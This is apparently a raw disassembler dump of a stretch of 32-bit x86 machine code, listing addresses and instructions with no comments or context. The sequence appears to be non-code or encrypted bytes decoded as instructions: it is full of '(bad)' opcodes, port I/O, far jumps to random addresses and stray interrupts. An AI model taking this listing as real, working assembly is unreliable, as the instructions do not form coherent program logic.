  409cfb:	mov    al,0x61
  409cfd:	or     DWORD PTR [eax],edi
  409cff:	push   edi
  409d00:	rol    BYTE PTR [edi-0x3c],1
  409d03:	inc    eax
  409d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d05:	jmp    FWORD PTR ds:0x4356e3a2
  409d0b:	sub    ecx,DWORD PTR [edx-0x407ae9e7]
  409d11:	mov    edi,0xd88366f5
  409d16:	jecxz  0x409d02
  409d18:	test   eax,0x200f9d69
  409d1d:	ja     0x409cff
  409d1f:	outs   dx,BYTE PTR ds:[esi]
  409d20:	fcmovnb st,st(2)
  409d22:	add    edi,DWORD PTR [ebx]
  409d24:	aad    0xc4
  409d26:	cdq    
  409d27:	leave  
  409d28:	or     DWORD PTR [edi],0xc2905755
  409d2e:	cmp    eax,0x4166e41
  409d33:	add    DWORD PTR [eax+0x9],ebx
  409d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d37:	les    eax,FWORD PTR [eax+0x78c9f571]
  409d3d:	add    ebp,DWORD PTR [eax+0x29ddbda]
  409d43:	dec    esp
  409d44:	jbe    0x409d46
  409d46:	push   edi
  409d47:	ret    0x3d3f
  409d4a:	lds    esp,FWORD PTR [edx-0x33]
  409d4d:	into   
  409d4e:	mov    BYTE PTR [ebx-0x6fd61714],bh
  409d54:	cwde   
  409d55:	inc    edx
  409d56:	dec    edx
  409d57:	scas   al,BYTE PTR es:[edi]
  409d58:	mov    bh,0xaa
  409d5a:	outs   dx,BYTE PTR ds:[esi]
  409d5b:	jns    0x409d10
  409d5d:	mov    ah,0x52
  409d5f:	sub    al,0x36
  409d61:	xchg   ebp,eax
  409d62:	in     al,dx
  409d63:	and    al,0x61
  409d65:	add    eax,0x5746fdcf
  409d6a:	dec    ebx
  409d6b:	xchg   BYTE PTR [eax+ecx*2-0x32d08450],dh
  409d72:	jo     0x409d71
  409d74:	fnstsw ax
  409d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d77:	adc    ah,BYTE PTR [eax+0x37a30cd7]
  409d7d:	mov    ds:0x978d429e,al
  409d82:	sbb    eax,edx
  409d84:	xchg   ebp,eax
  409d85:	in     al,dx
  409d86:	inc    ecx
  409d87:	fwait
  409d88:	add    BYTE PTR [esi+ebx*8],cl
  409d8b:	pop    ebx
  409d8c:	xchg   edi,eax
  409d8d:	vhsubpd xmm5,xmm0,XMMWORD PTR [ecx-0xe]
  409d92:	adc    DWORD PTR [eax+ebx*2],ecx
  409d95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d96:	jge    0x409dd6
  409d98:	addr16 retf 
  409d9a:	mov    al,0x8d
  409d9c:	mov    bl,0x54
  409d9e:	fucom  st(1)
  409da0:	int3   
  409da1:	cmp    eax,0x3c952067
  409da6:	sbb    eax,0xb1241f20
  409dab:	fld    QWORD PTR ds:0x8f4a56c9
  409db1:	sub    eax,0x1d0b190
  409db6:	add    esp,DWORD PTR [ebp+0x37]
  409db9:	lea    edx,[ebp+0xdfac337]
  409dbf:	loop   0x409e2f
  409dc1:	fwait
  409dc2:	mov    dh,0x34
  409dc4:	pop    edi
  409dc5:	or     al,0xd2
  409dc7:	sahf   
  409dc8:	pushf  
  409dc9:	aam    0xef
  409dcb:	iret   
  409dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dcd:	pop    edx
  409dce:	mov    cl,ch
  409dd0:	jae    0x409dbc
  409dd2:	mov    edx,0xf1b5baa5
  409dd7:	arpl   WORD PTR [edi+0x45ffe1eb],bx
  409ddd:	test   DWORD PTR [esp+ebx*8-0x18],ebx
  409de1:	in     al,dx
  409de2:	xchg   edi,eax
  409de3:	cmp    cl,cl
  409de5:	fwait
  409de6:	inc    edi
  409de7:	in     eax,dx
  409de8:	dec    edi
  409de9:	mov    ds:0x2038a7a5,eax
  409dee:	pop    ss
  409def:	push   0x4a1174c2
  409df4:	sub    BYTE PTR [ecx-0x1ec4cbb4],ah
  409dfa:	(bad)  
  409dfb:	clc    
  409dfc:	dec    ebp
  409dfd:	jns    0x409dbe
  409dff:	stc    
  409e00:	test   al,0x31
  409e02:	(bad)  
  409e03:	pop    eax
  409e04:	jno    0x409dcd
  409e06:	dec    edx
  409e07:	enter  0x5b6e,0x5b
  409e0b:	sar    BYTE PTR [edx],1
  409e0d:	and    edx,DWORD PTR [esi+edi*2+0x38]
  409e11:	cwde   
  409e12:	sbb    eax,0x5253b903
  409e17:	shl    edx,0x5e
  409e1a:	pop    esp
  409e1b:	adc    eax,0xd8c6a43a
  409e20:	das    
  409e21:	jl     0x409e75
  409e23:	gs cmc 
  409e25:	cmp    eax,0xdf60eaa3
  409e2a:	jae    0x409e88
  409e2c:	mov    ebp,DWORD PTR [edi]
  409e2e:	xchg   DWORD PTR [edi+eax*1],edi
  409e31:	shl    BYTE PTR [ebx-0x40],1
  409e34:	xchg   ebp,eax
  409e35:	inc    ecx
  409e36:	jne    0x409e3d
  409e38:	mov    ch,0xcd
  409e3a:	stos   DWORD PTR es:[edi],eax
  409e3b:	pop    ebx
  409e3c:	dec    edx
  409e3d:	mov    ebp,DWORD PTR [ebx+0x11]
  409e40:	xchg   ebx,eax
  409e41:	gs push es
  409e43:	dec    ebp
  409e44:	pop    esp
  409e45:	xor    ch,BYTE PTR [eax-0x38c687fd]
  409e4b:	add    DWORD PTR [edi],esp
  409e4d:	xchg   edx,eax
  409e4e:	add    dl,BYTE PTR [ecx]
  409e50:	fs es sbb bl,bl
  409e54:	sbb    al,0x3a
  409e56:	sahf   
  409e57:	adc    al,0xbc
  409e59:	hlt    
  409e5a:	inc    esp
  409e5b:	pop    edi
  409e5c:	mov    edi,0x85838936
  409e61:	push   ebp
  409e62:	std    
  409e63:	adc    bh,BYTE PTR [esi-0x10cbb720]
  409e69:	cmp    al,0x64
  409e6b:	mov    ebp,0x707500b3
  409e70:	nop
  409e71:	out    dx,eax
  409e72:	lea    esi,[edi+0x11]
  409e75:	stos   BYTE PTR es:[edi],al
  409e76:	ds jmp 0x409e94
  409e79:	aam    0x23
  409e7b:	xchg   ebp,eax
  409e7c:	mov    ecx,0x667ac665
  409e81:	mov    DWORD PTR [eax+0x566e6264],esi
  409e87:	push   es
  409e88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e89:	fst    QWORD PTR [esi]
  409e8b:	ins    DWORD PTR es:[edi],dx
  409e8c:	stc    
  409e8d:	add    BYTE PTR [ecx],ch
  409e8f:	aaa    
  409e90:	dec    eax
  409e91:	adc    BYTE PTR [esi],bh
  409e93:	jo     0x409e6f
  409e95:	lods   eax,DWORD PTR ds:[esi]
  409e96:	fistp  QWORD PTR [ecx]
  409e98:	mov    ebx,0x63574e12
  409e9d:	loope  0x409f19
  409e9f:	ret    
  409ea0:	and    eax,0x4a89fc78
  409ea5:	jmp    FWORD PTR [edx]
  409ea7:	in     al,0x1a
  409ea9:	sub    cl,BYTE PTR [eax]
  409eab:	mov    eax,0xde8c6d41
  409eb0:	dec    esi
  409eb1:	in     eax,0xee
  409eb3:	inc    edx
  409eb4:	ror    BYTE PTR [eax+0x31],0xf8
  409eb8:	loop   0x409f27
  409eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ebb:	push   0xffffffe5
  409ebd:	and    dl,ch
  409ebf:	pop    edx
  409ec0:	cmp    esi,DWORD PTR [ebx+0x12d38a00]
  409ec6:	and    eax,0xcb67171e
  409ecb:	jg     0x409f45
  409ecd:	stos   BYTE PTR es:[edi],al
  409ece:	out    0x67,al
  409ed0:	and    eax,0x79df2720
  409ed5:	mov    eax,ds:0x27a141c
  409eda:	mov    edi,0x66a9912c
  409edf:	xchg   edi,eax
  409ee0:	push   ecx
  409ee1:	add    BYTE PTR [edi-0x5a],bh
  409ee4:	(bad)  
  409ee5:	cmc    
  409ee6:	popa   
  409ee7:	retf   0x3009
  409eea:	das    
  409eeb:	sub    bl,cl
  409eed:	push   0xa1fae177
  409ef2:	test   DWORD PTR [edi+ebp*1+0x31],esp
  409ef6:	imul   esi,DWORD PTR [esi+0x52940f36],0xdcf1cfca
  409f00:	mov    esp,0xb30cf091
  409f05:	mov    esi,0x5e9a2415
  409f0a:	xor    bh,BYTE PTR ds:0x10336fc8
  409f10:	xchg   esi,eax
  409f11:	fsubp  st(5),st
  409f13:	mov    bl,0x5
  409f15:	pop    ebx
  409f16:	out    dx,al
  409f17:	call   0x163984c1
  409f1c:	jnp    0x409f35
  409f1e:	push   edi
  409f1f:	xor    ch,dh
  409f21:	mov    bl,0xbc
  409f23:	mov    ebp,esi
  409f25:	sbb    dh,BYTE PTR [ebx+0x268fa090]
  409f2b:	out    0xe5,al
  409f2d:	hlt    
  409f2e:	cs pop esi
  409f30:	push   eax
  409f31:	dec    edx
  409f32:	xchg   ebx,eax
  409f33:	pop    ecx
  409f34:	cmp    eax,0xe4be956d
  409f39:	popa   
  409f3a:	adc    ecx,eax
  409f3c:	test   DWORD PTR [edx+eax*2+0x283b0bf4],esi
  409f43:	test   al,0xa
  409f46:	ins    BYTE PTR es:[edi],dx
  409f47:	mov    al,ds:0x8010e9f7
  409f4c:	(bad)  
  409f4d:	cli    
  409f4e:	test   BYTE PTR [ebx+0x0],ch
  409f51:	jo     0x409f95
  409f53:	in     al,0xf
  409f55:	retf   
  409f56:	mov    eax,ds:0x6bb0163a
  409f5b:	sbb    al,0x95
  409f5d:	mov    dh,0x6f
  409f5f:	shl    esp,1
  409f61:	shl    DWORD PTR [esi+esi*1],cl
  409f64:	dec    esi
  409f65:	and    bl,BYTE PTR [ecx]
  409f67:	fadd   QWORD PTR [ebx]
  409f69:	shl    BYTE PTR [eax+ebp*2-0x293805f7],cl
  409f70:	fstp   DWORD PTR gs:[esi-0x5d]
  409f74:	xchg   edi,eax
  409f75:	adc    BYTE PTR [eax],dl
  409f77:	in     al,0xf1
  409f79:	add    eax,0xe506fa87
  409f7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f7f:	in     eax,0xee
  409f81:	cmp    al,0x19
  409f83:	pushf  
  409f84:	sbb    edi,eax
  409f86:	repnz adc ebp,DWORD PTR [ebx-0x10dc857]
  409f8d:	in     al,dx
  409f8e:	lea    ebp,[esi+eax*2]
  409f91:	fwait
  409f92:	(bad)
  409f97:	add    DWORD PTR [edi-0x5d],edx
  409f9a:	shr    BYTE PTR [ecx-0x79],1
  409f9d:	dec    ebp
  409f9e:	xchg   esi,eax
  409f9f:	imul   ebp,DWORD PTR [esi+ecx*4],0xfffffffb
  409fa3:	sbb    dl,bl
  409fa5:	ret    
  409fa6:	outs   dx,DWORD PTR ds:[esi]
  409fa7:	test   al,0x9f
  409fa9:	scas   eax,DWORD PTR es:[edi]
  409faa:	outs   dx,BYTE PTR ds:[esi]
  409fab:	push   esi
  409fac:	inc    esp
  409fad:	outs   dx,DWORD PTR ds:[esi]
  409fae:	fdivr  QWORD PTR [ebx]
  409fb0:	pop    edx
  409fb1:	into   
  409fb2:	cmp    eax,0x38833264
  409fb7:	jmp    0xb0d4:0xb7358073
  409fbe:	mov    edi,0x3d925474
  409fc3:	mov    ecx,0xe8ac4dca
  409fc8:	push   esi
  409fc9:	dec    esi
  409fca:	mov    bh,0x39
  409fcc:	mov    ebp,0x6437ed
  409fd1:	xchg   esi,eax
  409fd2:	pop    esi
  409fd3:	cmp    eax,0x2f5a503b
  409fd8:	and    ebp,ebx
  409fda:	mov    dh,0xed
  409fdc:	and    DWORD PTR [esi+0x625adcd5],0xffffffa3
  409fe3:	add    al,0x5a
  409fe5:	adc    dl,BYTE PTR [ecx-0x73]
  409fe8:	xchg   ecx,eax
  409fe9:	pop    esi
  409fea:	cmp    esp,DWORD PTR [eax]
  409fec:	popa   
  409fed:	jge    0x409f9e
  409fef:	push   ds
  409ff0:	xor    bh,BYTE PTR [esi-0x5b]
  409ff3:	fsubr  st,st(0)
  409ff5:	mov    esi,0xa3f31137
  409ffa:	push   esi
  409ffb:	cmp    edi,edi
  409ffd:	push   ebx
  409ffe:	cmc    
  409fff:	imul   esi,DWORD PTR [edi-0x69a89b0c],0xffffff9f
  40a006:	(bad)  
  40a007:	dec    edi
  40a008:	mov    eax,ds:0xf967dd6e
  40a00d:	loopne 0x409fb0
  40a00f:	and    eax,0xb0a89ab2
  40a014:	ds push eax
  40a016:	and    edx,DWORD PTR [edx-0x6b]
  40a019:	mov    dl,0xdd
  40a01b:	cdq    
  40a01c:	arpl   WORD PTR [edi-0x38],bx
  40a01f:	inc    ecx
  40a020:	pop    ebp
  40a021:	xor    eax,0xfe2e7095
  40a026:	ins    BYTE PTR es:[edi],dx
  40a027:	ins    BYTE PTR es:[edi],dx
  40a028:	jmp    0x8f5d4728
  40a02d:	push   es
  40a02e:	cmp    BYTE PTR [esi],bh
  40a030:	mov    eax,0x5956793d
  40a035:	repz aam 0xeb
  40a038:	lods   al,BYTE PTR ds:[esi]
  40a039:	dec    eax
  40a03a:	loop   0x40a03a
  40a03c:	cdq    
  40a03d:	es push 0xd24cf69a
  40a043:	maxps  xmm0,XMMWORD PTR [ecx+0x577a2df7]
  40a04a:	fyl2x  
  40a04c:	jns    0x40a01a
  40a04e:	jnp    0x40a00a
  40a050:	es (bad) 
  40a052:	and    BYTE PTR [eax],ah
  40a054:	xchg   ebp,eax
  40a055:	pushf  
  40a056:	dec    ebp
  40a057:	rcl    ah,cl
  40a059:	dec    ecx
  40a05a:	mov    esi,0x87950177
  40a05f:	shl    BYTE PTR [edi+0x66],cl
  40a062:	add    ch,BYTE PTR ds:0x9a4005d
  40a068:	mov    DWORD PTR [ecx+edi*2-0x17036027],ecx
  40a06f:	sti    
  40a070:	scas   eax,DWORD PTR es:[edi]
  40a071:	test   DWORD PTR [edx],ebx
  40a073:	xchg   eax,ecx
  40a075:	mov    BYTE PTR [eax+0x2f004118],dl
  40a07b:	call   0x470b:0x6ed27644
  40a082:	adc    eax,DWORD PTR [esi+0x753a1b44]
  40a088:	ss (bad) 
  40a08b:	cmp    BYTE PTR [ecx-0xd350f06],cl
  40a091:	popf   
  40a092:	xchg   DWORD PTR [edi-0x4e],eax
  40a095:	lods   eax,DWORD PTR ds:[esi]
  40a096:	sbb    DWORD PTR [ecx+ebx*8-0x738770bb],esp
  40a09d:	push   esi
  40a09e:	adc    ch,BYTE PTR [esi-0x3c]
  40a0a1:	push   ds
  40a0a2:	int    0xa6
  40a0a4:	stc    
  40a0a5:	inc    ebx
  40a0a6:	into   
  40a0a7:	and    BYTE PTR [edi],bh
  40a0a9:	push   ds
  40a0aa:	popa   
  40a0ab:	outs   dx,BYTE PTR ds:[esi]
  40a0ac:	jb     0x40a0b7
  40a0ae:	cmc    
  40a0af:	and    eax,0x985c25f9
  40a0b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0b5:	(bad)  
  40a0b6:	mov    ebx,0x6bac35d4
  40a0bb:	push   eax
  40a0bc:	aad    0xe8
  40a0be:	dec    esp
  40a0bf:	mov    edx,0xdc4f860c
  40a0c4:	sub    DWORD PTR [eax],esi
  40a0c6:	sbb    ah,BYTE PTR [esi-0x48f88603]
  40a0cc:	icebp  
  40a0cd:	retf   
  40a0ce:	mov    eax,ds:0x43461679
  40a0d3:	daa    
  40a0d4:	test   eax,0x833810cd
  40a0d9:	sbb    al,0xbc
  40a0db:	lods   al,BYTE PTR ds:[esi]
  40a0dc:	adc    eax,0x93ee3b50
  40a0e1:	dec    ecx
  40a0e2:	pop    ecx
  40a0e3:	xor    eax,0xff427949
  40a0e8:	hlt    
  40a0e9:	add    DWORD PTR [edi-0x7baec7eb],esp
  40a0ef:	(bad)  
  40a0f0:	in     al,dx
  40a0f1:	cli    
  40a0f2:	adc    BYTE PTR [edi-0x50],cl
  40a0f5:	ret    
  40a0f6:	rcr    DWORD PTR [ebp-0xf767844],cl
  40a0fc:	xchg   esi,eax
  40a0fd:	cdq    
  40a0fe:	(bad)  
  40a0ff:	cmp    BYTE PTR [ecx-0x20],bl
  40a102:	sahf   
  40a103:	jmp    0x958737f9
  40a108:	mov    bl,0xe4
  40a10a:	loope  0x40a0bb
  40a10c:	addr16 jle 0x40a146
  40a10f:	or     esi,DWORD PTR [ecx]
  40a111:	add    edx,edx
  40a113:	sub    bh,ah
  40a115:	mov    dl,0x9d
  40a117:	xor    ebp,ecx
  40a119:	xor    edi,DWORD PTR [esi+ecx*1]
  40a11c:	js     0x40a0bc
  40a11e:	push   ss
  40a11f:	ret    
  40a120:	div    DWORD PTR [edi+0x5c]
  40a123:	aas    
  40a124:	or     al,0xd0
  40a126:	mov    cl,0xaa
  40a128:	test   al,0x51
  40a12a:	retf   
  40a12b:	jle    0x40a15b
  40a12d:	out    dx,al
  40a12e:	aam    0x29
  40a130:	pusha  
  40a131:	mov    dl,0x8
  40a133:	sbb    BYTE PTR [ebx-0x2c],dh
  40a136:	push   esi
  40a137:	and    eax,0xc756d629
  40a13c:	cmp    al,ah
  40a13e:	mov    esi,0x7f597bfa
  40a143:	stos   DWORD PTR es:[edi],eax
  40a144:	call   0x31484b7c
  40a149:	ins    BYTE PTR es:[edi],dx
  40a14a:	cmp    BYTE PTR [ecx+0x27c4283e],dh
  40a150:	sub    DWORD PTR [edx+0x4b954380],ecx
  40a156:	adc    DWORD PTR [esi+0x5],eax
  40a159:	push   cs
  40a15a:	int    0xf7
  40a15c:	das    
  40a15d:	nop
  40a15e:	inc    ebp
  40a15f:	jl     0x40a0e6
  40a161:	inc    ecx
  40a162:	push   es
  40a163:	inc    ebp
  40a164:	repnz xor BYTE PTR [esp+eax*1],ch
  40a168:	sbb    edx,DWORD PTR [ebx-0x1f]
  40a16b:	loopne 0x40a1d9
  40a16d:	popf   
  40a16e:	jbe    0x40a1c8
  40a170:	xchg   BYTE PTR [edi-0x72],ah
  40a173:	sar    DWORD PTR ds:0x2ca04c07,0xea
  40a17a:	adc    DWORD PTR [ecx+0x14],esi
  40a17d:	xchg   edi,eax
  40a17e:	xchg   esi,eax
  40a17f:	cmp    DWORD PTR [ebx+0x6a],ecx
  40a182:	pop    ecx
  40a183:	es repnz push ebx
  40a186:	inc    edi
  40a187:	in     eax,0x0
  40a189:	scas   al,BYTE PTR es:[edi]
  40a18a:	das    
  40a18b:	popa   
  40a18c:	frstor [ebp+0xa]
  40a18f:	sar    DWORD PTR [ebx],cl
  40a191:	mov    esi,0xb549a12
  40a196:	sbb    ecx,DWORD PTR [ebp-0x59a6a431]
  40a19c:	fbstp  TBYTE PTR [edi+0x77]
  40a19f:	ror    bl,1
  40a1a1:	inc    edi
  40a1a2:	pop    ebp
  40a1a3:	(bad)  
  40a1a4:	or     eax,0xa4c3147
  40a1a9:	loope  0x40a227
  40a1ab:	jle    0x40a222
  40a1ad:	popa   
  40a1ae:	xlat   BYTE PTR ds:[ebx]
  40a1af:	push   eax
  40a1b0:	mov    ds:0xdaccb05,eax
  40a1b5:	stos   BYTE PTR es:[edi],al
  40a1b6:	push   edx
  40a1b7:	dec    eax
  40a1b8:	push   ebx
  40a1b9:	adc    edi,eax
  40a1bb:	mov    ds:0x3669158d,al
  40a1c0:	mov    al,0xa9
  40a1c2:	inc    eax
  40a1c3:	jbe    0x40a1da
  40a1c5:	(bad)
  40a1c9:	not    eax
  40a1cb:	shl    DWORD PTR [ecx+0x5eb45991],cl
  40a1d1:	(bad)  
  40a1d2:	jmp    0x19608936
  40a1d7:	xchg   ebp,eax
  40a1d8:	mov    ch,0x1d
  40a1da:	leave  
  40a1db:	add    BYTE PTR [esi+0x32],al
  40a1de:	jl     0x40a1a9
  40a1e0:	xchg   esi,eax
  40a1e1:	fcmovbe st,st(3)
  40a1e3:	dec    ebp
  40a1e4:	cmp    ah,BYTE PTR [ebp-0x177411e8]
  40a1ea:	bound  edi,QWORD PTR [ecx+0x2cf83151]
  40a1f0:	fistp  WORD PTR [ebx]
  40a1f2:	add    BYTE PTR [esi-0x2e],bl
  40a1f5:	and    BYTE PTR [ecx+0x31],cl
  40a1f8:	das    
  40a1f9:	imul   edx,DWORD PTR [eax-0x1ed3cb97],0xffffff8c
  40a200:	dec    esp
  40a201:	xchg   edi,eax
  40a202:	mov    edi,0xc4f1eef1
  40a207:	pusha  
  40a208:	adc    eax,0xad83f33d
  40a20d:	add    al,0x3d
  40a20f:	in     al,dx
  40a210:	xchg   esp,eax
  40a211:	mov    ebx,0x3eb7171
  40a216:	lgs    esi,FWORD PTR [ecx-0x42ba9305]
  40a21d:	ficom  WORD PTR [eax+edx*4]
  40a220:	mov    bh,0x3d
  40a222:	xchg   ecx,eax
  40a223:	pop    ebp
  40a224:	int    0x87
  40a226:	mov    ds,esp
  40a228:	mov    eax,eax
  40a22a:	popa   
  40a22b:	add    al,0x99
  40a22d:	inc    ebp
  40a22e:	sbb    ch,BYTE PTR [edi+0x65]
  40a231:	mov    eax,DWORD PTR [edx+0x34]
  40a234:	jle    0x40a1f3
  40a236:	js     0x40a279
  40a238:	icebp  
  40a239:	inc    edi
  40a23a:	(bad)  
  40a23b:	neg    BYTE PTR [ebx]
  40a23d:	test   al,0x75
  40a23f:	mov    bl,0xcd
  40a241:	sub    dh,ah
  40a243:	(bad)  
  40a244:	ins    BYTE PTR es:[edi],dx
  40a245:	sbb    esi,DWORD PTR ds:0xf5cb5b8
  40a24b:	ss out dx,ax
  40a24e:	test   DWORD PTR [esi+0x22fafeee],edx
  40a254:	ret    0xe3ff
  40a257:	xchg   DWORD PTR fs:[ecx+ebx*1],ebp
  40a25b:	pop    ss
  40a25c:	pop    edx
  40a25d:	mov    esi,edi
  40a25f:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a261:	inc    edi
  40a262:	call   0x2c7f172
  40a267:	pop    ds
  40a268:	mov    ebp,0x74d06cd0
  40a26d:	out    dx,eax
  40a26e:	in     eax,0x27
  40a270:	fdiv   QWORD PTR [ecx]
  40a272:	jae    0x40a29d
  40a274:	outs   dx,BYTE PTR ds:[esi]
  40a275:	xor    BYTE PTR [esi],dl
  40a277:	adc    dh,cl
  40a279:	jle    0x40a244
  40a27b:	test   eax,0x184e348d
  40a280:	xchg   DWORD PTR [esi+0x321ca7c7],ecx
  40a286:	jb     0x40a2c6
  40a288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a28a:	cmp    al,0xc7
  40a28c:	shl    DWORD PTR [edi-0x7a],1
  40a28f:	repnz push 0xdbba48da
  40a295:	jno    0x40a229
  40a297:	call   0x76c55a59
  40a29c:	in     al,0x3d
  40a29e:	es and esi,esi
  40a2a1:	sbb    eax,0xe5b1f43a
  40a2a6:	pop    esp
  40a2a7:	push   edx
  40a2a8:	mov    BYTE PTR [ebx-0x5d],cl
  40a2ab:	stos   DWORD PTR es:[edi],eax
  40a2ac:	int3   
  40a2ad:	xor    esp,edx
  40a2af:	imul   ecx,esp,0x8e1b0878
  40a2b5:	jbe    0x40a2e5
  40a2b7:	jb     0xa37fc402
  40a2bd:	push   esp
  40a2be:	pop    es
  40a2bf:	xchg   esi,eax
  40a2c0:	loope  0x40a326
  40a2c2:	mov    eax,0xcdb7efe8
  40a2c7:	jmp    0xbba2:0x4c13a863
  40a2ce:	stos   BYTE PTR es:[edi],al
  40a2cf:	push   ds
  40a2d0:	sbb    edx,DWORD PTR [esi]
  40a2d2:	cmp    al,0xfd
  40a2d4:	in     eax,dx
  40a2d5:	cmp    BYTE PTR [ecx+edi*2+0x2b445bed],dl
  40a2dc:	xor    al,0x33
  40a2de:	pusha  
  40a2df:	jne    0x40a2a5
  40a2e1:	popf   
  40a2e2:	mov    esp,0x1235c26d
  40a2e7:	retf   0xa814
  40a2ea:	jmp    0xf60f:0xcb7efb32
  40a2f1:	push   eax
  40a2f2:	ja     0x40a27b
  40a2f4:	les    ebp,FWORD PTR [edx-0x7]
  40a2f7:	ret    0xa486
  40a2fa:	mov    al,0x81
  40a2fc:	cmc    
  40a2fd:	data16 (bad) 
  40a2ff:	lods   eax,DWORD PTR ds:[esi]
  40a300:	sub    esi,DWORD PTR [eax-0x3814d943]
  40a306:	push   cs
  40a307:	adc    BYTE PTR [ecx+0x36],dl
  40a30a:	adc    ecx,ebp
  40a30c:	push   cs
  40a30d:	aad    0x66
  40a30f:	sar    BYTE PTR [esi],1
  40a311:	fidivr WORD PTR [ebp+0x32895f9d]
  40a317:	test   ebp,esi
  40a319:	jg     0x40a2f1
  40a31b:	mov    dl,0x31
  40a31d:	retf   0x2fe9
  40a320:	mov    BYTE PTR [ecx],al
  40a322:	mov    esp,0xf15fd105
  40a327:	int    0x9e
  40a329:	pop    DWORD PTR [eax]
  40a32b:	jnp    0x40a2b8
  40a32d:	mov    esp,?
  40a32f:	adc    bl,BYTE PTR [eax+0x620ec8ff]
  40a335:	jmp    FWORD PTR [eax-0x26]
  40a338:	adc    ecx,DWORD PTR [ebx+0x7e7dfff8]
  40a33e:	aad    0x3
  40a340:	push   esp
  40a341:	xor    eax,0xb5a980e3
  40a346:	(bad)  
  40a347:	cmp    esi,ebp
  40a349:	rol    ch,cl
  40a34b:	das    
  40a34c:	or     eax,esp
  40a34e:	fs mov dl,0xbe
  40a351:	sbb    ebx,DWORD PTR [ebx]
  40a353:	loop   0x40a313
  40a355:	xchg   esp,eax
  40a356:	jmp    DWORD PTR [eax]
  40a358:	fisubr DWORD PTR [edx+eiz*8]
  40a35b:	(bad)  
  40a35c:	std    
  40a35d:	into   
  40a35e:	les    ecx,FWORD PTR [ecx]
  40a360:	and    ebx,0x1
  40a363:	std    
  40a364:	add    ch,BYTE PTR [esi+ecx*1-0x46]
  40a368:	int    0x60
  40a36a:	cdq    
  40a36b:	or     DWORD PTR [ebp+0x6ffefbc7],ecx
  40a371:	fistp  QWORD PTR [eax]
  40a373:	outs   dx,BYTE PTR ds:[esi]
  40a374:	ss push esp
  40a376:	pusha  
  40a377:	dec    ebx
  40a378:	jae    0x40a31c
  40a37a:	(bad)  
  40a37b:	mov    edx,0xd9d6b461
  40a380:	fwait
  40a381:	test   DWORD PTR [esi-0x5f],esp
  40a384:	jns    0x40a322
  40a386:	push   ebp
  40a387:	and    eax,0xe5cffc7d
  40a38c:	push   edi
  40a38d:	push   edi
  40a38e:	jbe    0x40a311
  40a390:	pop    ecx
  40a391:	ins    BYTE PTR es:[edi],dx
  40a392:	loopne 0x40a413
  40a394:	sbb    eax,0x139306f2
  40a399:	and    eax,0x4464dc7a
  40a39e:	jbe    0x40a419
  40a3a0:	scas   eax,DWORD PTR es:[edi]
  40a3a1:	outs   dx,DWORD PTR ds:[esi]
  40a3a2:	int    0xba
  40a3a4:	sub    DWORD PTR [ecx+eax*4-0x6e],esi
  40a3a8:	out    dx,al
  40a3a9:	out    0x8b,eax
  40a3ab:	mov    ecx,0x671c54bc
  40a3b0:	int3   
  40a3b1:	call   0x39977553
  40a3b6:	xor    eax,0xdac71fe2
  40a3bb:	lea    ecx,[ebx-0x44]
  40a3be:	jo     0x40a410
  40a3c0:	pop    ebx
  40a3c1:	inc    edi
  40a3c2:	lods   eax,DWORD PTR ds:[esi]
  40a3c3:	scas   eax,DWORD PTR es:[edi]
  40a3c4:	dec    edi
  40a3c5:	inc    esp
  40a3c6:	pop    edx
  40a3c7:	or     bh,al
  40a3c9:	push   ebx
  40a3ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3cb:	sub    ebp,DWORD PTR [ebx-0x3b8b4ce8]
  40a3d1:	push   DWORD PTR [edi]
  40a3d3:	or     al,0x4a
  40a3d5:	mov    edx,0xf6e7f977
  40a3da:	adc    eax,DWORD PTR [ebx]
  40a3dc:	push   ecx
  40a3dd:	int    0x0
  40a3df:	adc    al,0xe8
  40a3e1:	bound  eax,QWORD PTR [ecx]
  40a3e3:	sti    
  40a3e4:	add    eax,0x5e472b67
  40a3e9:	sbb    al,0xe0
  40a3eb:	and    ah,BYTE PTR [edi]
  40a3ed:	mov    bl,0xe6
  40a3ef:	mov    al,0x50
  40a3f1:	mov    ebx,0x4cde1d00
  40a3f6:	or     bh,ch
  40a3f8:	mov    al,ds:0xe8cc60e4
  40a3fd:	xchg   edx,eax
  40a3fe:	fs mov esi,0xf9d2a351
  40a404:	inc    eax
  40a405:	mov    ebp,esp
  40a407:	jmp    0xbceea9b6
  40a40c:	dec    eax
  40a40d:	fadd   QWORD PTR [ebp-0xb]
  40a410:	stos   BYTE PTR es:[edi],al
  40a411:	pop    ebp
  40a412:	add    DWORD PTR [ebx+ebx*2],ebp
  40a415:	jmp    0xf286:0xcdac9363
  40a41c:	mov    ebx,0x55283e9b
  40a421:	out    dx,al
  40a422:	mov    ch,0x89
  40a424:	add    bh,BYTE PTR [ebp+0x18826801]
  40a42a:	out    0x48,al
  40a42c:	mov    ebx,0xc842c34f
  40a431:	imul   edx,DWORD PTR [eax-0x4b],0x6c2c2cd
  40a438:	mov    edi,0x58ea124a
  40a43d:	and    al,bh
  40a43f:	pop    ds
  40a440:	das    
  40a441:	retf   0x5507
  40a444:	jns    0x40a440
  40a446:	pop    esi
  40a447:	shr    ecx,cl
  40a449:	push   ebx
  40a44a:	dec    eax
  40a44b:	fnstenv [ecx+0x19dcc62b]
  40a451:	jns    0x40a497
  40a453:	mov    DWORD PTR [edx],edi
  40a455:	ins    BYTE PTR es:[edi],dx
  40a456:	xchg   BYTE PTR [ebx+0x7],al
  40a459:	or     BYTE PTR [edi+0x10],0x13
  40a45d:	fneni(8087 only) 
  40a45f:	add    bh,BYTE PTR [ecx+esi*4-0x27]
  40a463:	inc    eax
  40a464:	adc    al,0x2b
  40a466:	jle    0x40a4a1
  40a468:	neg    eax
  40a46a:	push   ds
  40a46b:	ins    DWORD PTR es:[edi],dx
